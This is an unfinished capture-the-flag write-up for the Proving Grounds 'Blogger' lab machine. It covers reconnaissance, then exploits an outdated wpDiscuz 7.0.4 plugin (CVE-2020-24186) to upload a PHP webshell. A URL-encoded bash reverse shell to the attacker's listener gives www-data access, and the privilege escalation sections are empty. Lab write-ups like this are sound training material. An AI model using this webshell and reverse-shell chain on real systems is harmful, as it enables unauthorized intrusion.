---
title: Blogger
parent: Proving Grounds Play
grand_parent: Writeups
nav_order:
---
# Machine
## OS
## Level

---
# Reconnaissance
```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/Blogger]
└─$ nmap -T4 -A $IP -oN nmap.txt
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-29 04:05 +0900
Nmap scan report for 192.168.184.217
Host is up (0.079s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 95:1d:82:8f:5e:de:9a:00:a8:07:39:bd:ac:ad:d3:44 (RSA)
|   256 d7:b4:52:a2:c8:fa:b7:0e:d1:a8:d0:70:cd:6b:36:90 (ECDSA)
|_  256 df:f2:4f:77:33:44:d5:93:d7:79:17:45:5a:a1:36:8b (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.13 - 4.4
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   76.75 ms 192.168.45.1
2   76.73 ms 192.168.45.254
3   77.13 ms 192.168.251.1
4   77.21 ms 192.168.184.217

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.82 seconds
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/Blogger]
└─$ whatweb -a 3 http://$IP           
http://192.168.184.217 [200 OK] Apache[2.4.18], Bootstrap[4.0.0], Country[RESERVED][ZZ], Email[example@email.com,mail@example.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[192.168.184.217], JQuery[2.2.3], PasswordField, Script, Title[Blogger | Home]
```

![](../../../assets/images/Pasted%20image%2020260529041057.png)

![](../../../assets/images/Pasted%20image%2020260529041042.png)

[W3layouts](http://w3layouts.com/)

![](../../../assets/images/Pasted%20image%2020260529041138.png)

![](../../../assets/images/Pasted%20image%2020260529041606.png)

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/Blogger]
└─$ feroxbuster \
-u http://$IP \   
-w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt \
-x html,git,php,txt,bak,zip,old \
-d 2 \
-t 25 \
-r \
--random-agent \
-C 403,404 \
-o ferox.txt
```

![](../../../assets/images/Pasted%20image%2020260529052106.png)

![](../../../assets/images/Pasted%20image%2020260529044207.png)

http://192.168.184.217/assets/fonts/blog/

![](../../../assets/images/Pasted%20image%2020260529044305.png)

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/Blogger]
└─$ echo 192.168.184.217 blogger.pg | sudo tee -a /etc/hosts
[sudo] password for kali: 
192.168.184.217 blogger.pg
```
![](../../../assets/images/Pasted%20image%2020260529044558.png)

![](../../../assets/images/Pasted%20image%2020260529044810.png)

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/Blogger]
└─$ wpscan --url http://blogger.pg/assets/fonts/blog/ --plugins-detection aggressive
```

```zsh
[+] wpdiscuz
 | Location: http://blogger.pg/assets/fonts/blog/wp-content/plugins/wpdiscuz/
 | Last Updated: 2026-05-27T16:54:00.000Z
 | Readme: http://blogger.pg/assets/fonts/blog/wp-content/plugins/wpdiscuz/readme.txt
 | [!] The version is out of date, the latest version is 7.6.56
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://blogger.pg/assets/fonts/blog/wp-content/plugins/wpdiscuz/, status: 200
 |
 | Version: 7.0.4 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blogger.pg/assets/fonts/blog/wp-content/plugins/wpdiscuz/readme.txt
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/Blogger]
└─$ searchsploit wpdiscuz
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
Wordpress Plugin wpDiscuz 7.0.4 - Arbitrary File Upload (Unauthentica | php/webapps/49962.sh
WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthentica | php/webapps/49967.py
Wordpress Plugin wpDiscuz 7.0.4 - Unauthenticated Arbitrary File Uplo | php/webapps/49401.rb
---------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/Blogger]
└─$ python3 49967.py -u http://blogger.pg/assets/fonts/blog -p /?p=29
---------------------------------------------------------------
[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution
[-] File Upload Bypass Vulnerability - PHP Webshell Upload
[-] CVE: CVE-2020-24186
[-] https://github.com/hevox
--------------------------------------------------------------- 

[+] Response length:[59354] | code:[200]
[!] Got wmuSecurity value: 710169e218
[!] Got wmuSecurity value: 29 

[+] Generating random name for Webshell...
[!] Generated webshell name: bnqrombyizqeisf

[!] Trying to Upload Webshell..
[+] Upload Success... Webshell path:url&quot;:&quot;http://blogger.pg/assets/fonts/blog/wp-content/uploads/2026/05/bnqrombyizqeisf-1780000071.8944.php&quot; 

>  

[x] Failed to execute PHP code..
```

ttp://blogger.pg/assets/fonts/blog/wp-content/uploads/2026/05/bnqrombyizqeisf-1780000071.8944.php?cmd=id

![](../../../assets/images/Pasted%20image%2020260529053002.png)

http://blogger.pg/assets/fonts/blog/wp-content/uploads/2026/05/bnqrombyizqeisf-1780000071.8944.php?cmd=which%20nc

![](../../../assets/images/Pasted%20image%2020260529053105.png)


---

# Initial Access

https://www.tagindex.com/cgi-lib/encode/url.cgi

![](../../../assets/images/Pasted%20image%2020260529055408.png)
```zsh
http://blogger.pg/assets/fonts/blog/wp-content/uploads/2026/05/bnqrombyizqeisf-1780000071.8944.php?cmd=bash%20-c%20%27exec%20bash%20-i%20%26%3E%2Fdev%2Ftcp%2F192.168.45.195%2F4444%20%3C%261%27
```

![](../../../assets/images/Pasted%20image%2020260529055259.png)

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/Blogger]
└─$ rlwrap -cAr nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.195] from (UNKNOWN) [192.168.184.217] 38392
bash: cannot set terminal process group (1364): Inappropriate ioctl for device
bash: no job control in this shell
<ress/assets/fonts/blog/wp-content/uploads/2026/05$ 
```

```zsh
<ress/assets/fonts/blog/wp-content/uploads/2026/05$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                               
<ress/assets/fonts/blog/wp-content/uploads/2026/05$ 
```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```
---

# Privilege Escalation

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```


<details markdown="1">
<summary>Walkthrough</summary>

```zsh

```

</details>